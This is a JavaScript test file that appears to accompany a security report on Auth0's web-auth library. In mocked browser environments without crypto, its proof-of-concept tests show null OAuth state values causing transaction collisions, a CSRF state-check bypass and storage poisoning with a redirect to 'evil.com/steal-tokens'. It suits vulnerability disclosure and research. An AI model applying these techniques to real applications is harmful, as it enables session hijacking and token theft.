import expect from 'expect.js';
import sinon from 'sinon';

import windowHelper from '../../src/helper/window';
import random from '../../src/helper/random';
import TransactionManager from '../../src/web-auth/transaction-manager';
import WebAuth from '../../src/web-auth/index';
import Storage from '../../src/helper/storage';

describe('Realistic Exploitability Assessment', function() {
  
  afterEach(function() {
    if (windowHelper.getWindow.restore) {
      windowHelper.getWindow.restore();
    }
  });

  describe('PoC 1: Cross-user session collision', function() {
    
    it('REALISTIC TEST: Can attacker hijack another users transaction?', function() {
      // Mock storage to track what gets stored
      const mockStorage = {};
      const storage = {
        setItem: function(key, value) {
          console.log(`üìù Storage SET: ${key} = ${JSON.stringify(value)}`);
          mockStorage[key] = value;
        },
        getItem: function(key) {
          console.log(`üìñ Storage GET: ${key}`);
          return mockStorage[key];
        },
        removeItem: function(key) {
          console.log(`üóëÔ∏è  Storage REMOVE: ${key}`);
          delete mockStorage[key];
        }
      };

      // Mock environment without crypto
      sinon.stub(windowHelper, 'getWindow').returns({
        location: { host: 'example.com' }, // Not auth domain, so storage is used
        localStorage: storage
      });

      const tmOptions = {
        domain: 'test.auth0.com',
        clientID: 'test-client'
      };
      
      const tm = new TransactionManager(tmOptions);
      
      console.log('\nüéØ SCENARIO: Two users start authentication simultaneously');
      
      // User A starts authentication
      console.log('\nüë§ USER A: Starting authentication...');
      const userATx = tm.generateTransaction(
        'userA-appstate', 
        null,  // No state provided, should use randomString
        null,  // No nonce provided, should use randomString  
        'userA-connection',
        true,  // Generate nonce
        null
      );
      
      // User B starts authentication (overwrites User A's transaction)
      console.log('\nüë§ USER B: Starting authentication...');
      const userBTx = tm.generateTransaction(
        'userB-appstate',
        null,  // No state provided, should use randomString
        null,  // No nonce provided, should use randomString
        'userB-connection', 
        true,  // Generate nonce
        null
      );
      
      console.log('\nüîç ANALYSIS:');
      console.log('User A state:', userATx.state);
      console.log('User B state:', userBTx.state);
      console.log('States are identical:', userATx.state === userBTx.state);
      
      // Now User A completes authentication, but gets User B's data
      console.log('\nüö® EXPLOITATION: User A completes auth...');
      const retrievedTransaction = tm.getStoredTransaction(userATx.state);
      
      console.log('User A expected connection:', 'userA-connection');
      console.log('User A actual connection:', retrievedTransaction?.lastUsedConnection);
      console.log('Data corruption occurred:', retrievedTransaction?.lastUsedConnection !== 'userA-connection');
      
      // This demonstrates the vulnerability is real
      expect(userATx.state).to.be(null);
      expect(userBTx.state).to.be(null);
      expect(retrievedTransaction?.lastUsedConnection).to.equal('userB-connection');
    });
  });

  describe('PoC 2: CSRF bypass with predictable state', function() {
    
    it('REALISTIC TEST: Can attacker bypass CSRF with null state?', function() {
      // Mock environment without crypto
      sinon.stub(windowHelper, 'getWindow').returns({
        location: { host: 'victim-app.com' },
        crypto: undefined,
        msCrypto: undefined
      });

      const webAuth = new WebAuth({
        domain: 'victim.auth0.com',
        clientID: 'victim-client-id',
        redirectUri: 'https://victim-app.com/callback',
        responseType: 'id_token'
      });
      
      console.log('\nüéØ SCENARIO: CSRF attack with predictable null state');
      
      // Attacker knows state will be null in crypto-unavailable environment
      // Attacker crafts malicious callback
      const maliciousCallback = {
        state: null,
        id_token: 'attacker-controlled-token'
      };
      
      console.log('\nüîç Testing state validation logic...');
      
      // Simulate the validation that happens in validateAuthenticationResponse
      const incomingState = maliciousCallback.state;  // null from attacker
      const transactionState = null;  // null from victim's transaction
      
      const transactionStateMatchesState = transactionState === incomingState;
      const shouldBypassStateChecking = !incomingState && !transactionState && false; // IdP-initiated disabled
      
      console.log('Incoming state (attacker):', incomingState);
      console.log('Transaction state (victim):', transactionState);
      console.log('State match result:', transactionStateMatchesState);
      console.log('Should bypass checking:', shouldBypassStateChecking);
      
      const validationPassed = shouldBypassStateChecking || transactionStateMatchesState;
      console.log('üö® CSRF validation result:', validationPassed ? 'BYPASSED' : 'BLOCKED');
      
      // The vulnerability: validation passes when both are null
      expect(transactionStateMatchesState).to.be(true);
      expect(validationPassed).to.be(true);
    });
  });

  describe('PoC 3: Storage poisoning attack', function() {
    
    it('REALISTIC TEST: Can attacker poison transaction storage?', function() {
      // Mock shared storage (same domain)
      const sharedStorage = {};
      
      sinon.stub(windowHelper, 'getWindow').returns({
        location: { host: 'shared-domain.com' },
        localStorage: {
          setItem: function(key, value) {
            sharedStorage[key] = typeof value === 'string' ? value : JSON.stringify(value);
          },
          getItem: function(key) {
            const value = sharedStorage[key];
            try {
              return JSON.parse(value);
            } catch (e) {
              return value;
            }
          },
          removeItem: function(key) {
            delete sharedStorage[key];
          }
        }
      });
      
      console.log('\nüéØ SCENARIO: Cross-application storage poisoning');
      
      // Step 1: Attacker poisons the global null key
      console.log('\nüíÄ ATTACKER: Poisoning storage...');
      const maliciousData = {
        nonce: 'attacker-controlled-nonce',
        appState: { redirectTo: 'https://evil.com/steal-tokens' },
        state: null,
        lastUsedConnection: 'attacker-db'
      };
      
      sharedStorage['com.auth0.auth.null'] = JSON.stringify(maliciousData);
      console.log('Poisoned key "com.auth0.auth.null" with:', maliciousData);
      
      // Step 2: Victim app starts authentication in crypto-unavailable env
      console.log('\nüë§ VICTIM: Starting authentication...');
      
      const victimTM = new TransactionManager({
        domain: 'victim.auth0.com',
        clientID: 'victim-client'
      });
      
      // This would normally create a new transaction, but null state means
      // it uses the poisoned data when retrieved
      const transaction = victimTM.generateTransaction(
        'legitimate-appstate',
        null,  // null state - uses com.auth0.auth.null key
        null,
        'legitimate-connection',
        true,
        null
      );
      
      console.log('\nüîç EXPLOITATION: Victim retrieves transaction...');
      const retrievedData = victimTM.getStoredTransaction(transaction.state);
      
      console.log('Victim expected connection:', 'legitimate-connection');
      console.log('Victim actual connection:', retrievedData?.lastUsedConnection);
      console.log('Victim expected appState:', 'legitimate-appstate');
      console.log('Victim actual appState:', retrievedData?.appState);
      
      console.log('\nüö® ATTACK SUCCESS:', retrievedData?.lastUsedConnection === 'attacker-db');
      
      // Verify the attack succeeded
      expect(transaction.state).to.be(null);
      expect(retrievedData?.lastUsedConnection).to.equal('attacker-db');
      expect(retrievedData?.appState?.redirectTo).to.equal('https://evil.com/steal-tokens');
    });
  });

  describe('Real-world feasibility assessment', function() {
    
    it('ASSESSMENT: When do crypto APIs actually become unavailable?', function() {
      console.log('\nüìä REAL-WORLD ANALYSIS:');
      
      // Test what happens in different browser scenarios
      const scenarios = [
        {
          name: 'Modern Chrome/Firefox',
          hasCrypto: true,
          risk: 'LOW',
          note: 'crypto.getRandomValues always available'
        },
        {
          name: 'IE 11',
          hasCrypto: true,
          risk: 'LOW', 
          note: 'msCrypto.getRandomValues available'
        },
        {
          name: 'IE 10 and below',
          hasCrypto: false,
          risk: 'HIGH',
          note: 'No crypto APIs available'
        },
        {
          name: 'Strict CSP environments',
          hasCrypto: false,
          risk: 'MEDIUM',
          note: 'CSP may disable crypto APIs'
        },
        {
          name: 'Embedded WebViews',
          hasCrypto: false,
          risk: 'MEDIUM',
          note: 'May have restricted crypto access'
        },
        {
          name: 'Testing frameworks (JSDOM)',
          hasCrypto: false,
          risk: 'LOW',
          note: 'Not production environment'
        }
      ];
      
      scenarios.forEach(scenario => {
        console.log(`\nüîç ${scenario.name}:`);
        console.log(`   Has Crypto: ${scenario.hasCrypto}`);
        console.log(`   Risk Level: ${scenario.risk}`);
        console.log(`   Note: ${scenario.note}`);
      });
      
      const highRiskScenarios = scenarios.filter(s => s.risk === 'HIGH').length;
      const totalScenarios = scenarios.length;
      
      console.log(`\nüìà SUMMARY: ${highRiskScenarios}/${totalScenarios} scenarios are high-risk`);
      console.log('üí° VERDICT: Vulnerability affects legacy/restricted environments');
      
      expect(highRiskScenarios).to.be.greaterThan(0);
    });
    
    it('ASSESSMENT: Why might this be marked "Not applicable"?', function() {
      console.log('\nü§î POSSIBLE REJECTION REASONS:');
      
      const rejectionReasons = [
        '1. THEORETICAL: Difficult to reproduce in modern browsers',
        '2. LEGACY IMPACT: Primarily affects outdated environments (IE ‚â§10)',
        '3. BUSINESS DECISION: Auth0 may not support these environments',
        '4. MITIGATION EXISTS: Applications should validate environment',
        '5. LIMITED SCOPE: Requires specific environmental conditions',
        '6. DETECTION DIFFICULTY: Hard to exploit reliably',
        '7. ALTERNATIVE FLOWS: Server-side flows recommended for restricted environments'
      ];
      
      rejectionReasons.forEach(reason => {
        console.log(`   ${reason}`);
      });
      
      console.log('\nüí≠ LIKELY REASON: Auth0 considers IE ‚â§10 and crypto-disabled');
      console.log('   environments as unsupported/out-of-scope');
      console.log('\nüéØ BUSINESS JUSTIFICATION: Cost of fixing vs. affected user base');
      
      expect(rejectionReasons.length).to.be.greaterThan(0);
    });
  });
});